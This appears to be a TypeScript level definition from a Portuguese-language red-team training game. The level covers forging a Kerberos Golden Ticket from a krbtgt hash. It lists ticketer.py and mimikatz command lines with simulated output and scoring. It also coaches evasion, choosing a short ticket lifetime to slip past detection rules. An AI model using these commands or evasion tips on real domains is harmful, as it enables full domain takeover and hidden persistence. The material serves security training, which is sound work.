import type { PhaseDefinition } from "./types";

export const phase12: PhaseDefinition = {
  number: 12,
  technicalName: "Golden Ticket",
  thematicName: "Forja de TGT com krbtgt para persistência",
  objective:
    "Forjar um Golden Ticket com lifetime razoável (não 10 anos), usando o hash krbtgt extraído por DCSync.",
  context: ds =>
    [
      `👑 Você está prestes a falsificar a moeda do reino. Com a chave de krbtgt, qualquer TGT que você`,
      `   imprimir tem a assinatura válida do KDC — ele simplesmente vai aceitar. Você pode ser quem quiser.`,
      ``,
      `⏳ Detalhe que separa um operador maduro de um script kiddie: TEMPO DE VIDA.`,
      `   O default do Mimikatz é 10 anos — exatamente o que regras de "TGT com lifetime absurdo" caçam.`,
      `   Um TGT de 10h passa por inspeção visual e cumpre o trabalho até o fim da janela operacional.`,
      ``,
      `📝 Antes de avançar, justifique sua escolha de lifetime/ferramenta.`,
      ``,
      `👉 Comando esperado: ticketer.py  (caminho alternativo: mimikatz com PTT, mais barulhento)`
    ].join("\n"),
  expectedCommand: "ticketer.py",
  requiresJustification: true,
  options: [
    {
      id: "a",
      text: "ticketer.py -nthash {krbtgt} -domain-sid <SID> -domain {dom} -duration 10 administrator",
      correct: true,
      response: ds =>
        [
          `[*] Creating basic skeleton ticket and PAC Infos`,
          `[*] Customizing ticket for ${ds.domain}/administrator`,
          `[*] PAC_LOGON_INFO`,
          `[*] PAC_CLIENT_INFO_TYPE`,
          `[*] Saving ticket in administrator.ccache (lifetime=10h)`,
          ``,
          `[+] Golden Ticket forjado com lifetime curto — pronto para uso (export KRB5CCNAME).`
        ].join("\n"),
      scoreDelta: 1.5,
      detectionDelta: 4,
      budgetDelta: -6,
      unlockEvidences: ds => [
        {
          label: "Golden Ticket forjado",
          payload: {
            user: `administrator@${ds.domain}`,
            lifetime: "10h",
            tool: "ticketer.py",
            outFile: "administrator.ccache"
          }
        }
      ],
      flag: ds => ds.flags.p12
    },
    {
      id: "b",
      text: "ticketer.py -nthash {krbtgt} -domain-sid <SID> -domain {dom} -duration 87600 administrator",
      correct: false,
      response: () =>
        "Lifetime de 10 anos é exatamente o padrão Mimikatz que regras de detecção (TGTs >24h) capturam.",
      scoreDelta: -0.4,
      detectionDelta: 22,
      budgetDelta: -6
    },
    {
      id: "c",
      text: "mimikatz kerberos::golden /user:Administrator /domain:{dom} /sid:<SID> /krbtgt:{krbtgt} /ptt",
      correct: true,
      alternativePath: true,
      response: ds =>
        [
          `Golden ticket for 'Administrator @ ${ds.domain}' successfully submitted for current session`,
          ``,
          `[!] PTT direto na sessão. Funcional, porém Mimikatz é forte trigger de AV.`
        ].join("\n"),
      scoreDelta: 0.9,
      detectionDelta: 14,
      budgetDelta: -5,
      unlockEvidences: ds => [
        {
          label: "Golden Ticket via Mimikatz",
          payload: { tool: "mimikatz", lifetime: "default" }
        }
      ],
      flag: ds => ds.flags.p12
    },
    {
      id: "d",
      text: "ticketer.py -nthash {krbtgt} -domain-sid <SID> -domain {dom} guest",
      correct: false,
      response: () =>
        "Forjar como 'guest' não eleva privilégios; objetivo perdido.",
      scoreDelta: -0.3,
      detectionDelta: 4,
      budgetDelta: -4
    },
    {
      id: "e",
      text: "ticketer.py -nthash {wrong-hash} -domain-sid <SID> -domain {dom} administrator",
      correct: false,
      response: () => "Hash incorreto → TGT inválido; falha imediata no primeiro uso.",
      scoreDelta: -0.5,
      detectionDelta: 6,
      budgetDelta: -4
    }
  ],
  techExplanation:
    "Golden Ticket: forja TGT cifrado com a chave de krbtgt. Lifetimes curtos (1-10h) e SIDs corretos no PAC reduzem flags. Permite persistência mesmo após reset de senhas de usuário (mas não após duplo reset de krbtgt)."
};
